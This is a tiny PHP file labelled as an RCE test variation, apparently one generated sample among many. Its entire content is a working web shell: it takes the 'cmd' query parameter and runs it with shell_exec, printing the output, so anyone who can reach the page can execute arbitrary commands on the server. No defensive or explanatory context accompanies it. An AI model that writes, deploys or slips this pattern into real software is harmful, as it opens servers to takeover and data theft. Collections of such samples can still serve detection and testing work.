<?php
// RCE test variation #1101
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>